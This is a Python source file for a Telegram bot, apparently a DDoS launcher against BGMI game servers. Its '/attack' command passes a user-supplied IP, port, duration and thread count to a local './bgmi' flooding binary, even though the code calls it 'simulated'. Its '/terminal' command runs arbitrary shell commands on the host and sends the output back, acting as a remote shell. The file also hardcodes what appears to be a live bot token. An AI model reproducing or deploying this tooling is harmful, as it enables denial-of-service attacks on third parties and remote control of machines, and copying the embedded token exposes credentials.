import os
import asyncio
import socket
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Set your bot token and allowed user ID
TELEGRAM_BOT_TOKEN = '7623380258:AAHtmKVKzNvumZyU0-GdOZ2WJ3a5XJSeMxw'
ALLOWED_USER_ID = 6479495033  # Change to your Telegram user ID

# Optional: restrict terminal access to a specific host (e.g., GitHub Codespace)
# AUTHORIZED_HOST = "your-host-name"  # Uncomment if needed

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Commands:*\n"
        "`/attack <ip> <port> <duration> <threads>` - Launch simulated attack\n"
        "`/terminal <command>` - Run server terminal command\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, threads, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args

    if not (port.isdigit() and duration.isdigit() and threads.isdigit()):
        await context.bot.send_message(chat_id=chat_id, text="*❗ Port, duration, and threads must be numbers.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔁 Threads: {threads}*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))

async def run_terminal_command(command, chat_id, context):
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        output = stdout.decode().strip() + "\n" + stderr.decode().strip()
        if not output.strip():
            output = "✅ Command executed successfully, no output."

        if len(output) > 4000:
            output = output[:4000] + "\n... (truncated)"

        await context.bot.send_message(chat_id=chat_id, text=f"```\n{output}\n```", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Error:* `{str(e)}`", parse_mode='Markdown')

async def terminal(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /terminal <command>*", parse_mode='Markdown')
        return

    # Optional host lock:
    # if socket.gethostname() != AUTHORIZED_HOST:
    #     await context.bot.send_message(chat_id=chat_id, text="*❌ Terminal access denied: unauthorized host.*", parse_mode='Markdown')
    #     return

    command = " ".join(context.args)

    await context.bot.send_message(chat_id=chat_id, text=f"*⏳ Executing:* `{command}`", parse_mode='Markdown')
    asyncio.create_task(run_terminal_command(command, chat_id, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("terminal", terminal))

    application.run_polling()

if __name__ == '__main__':
    main()
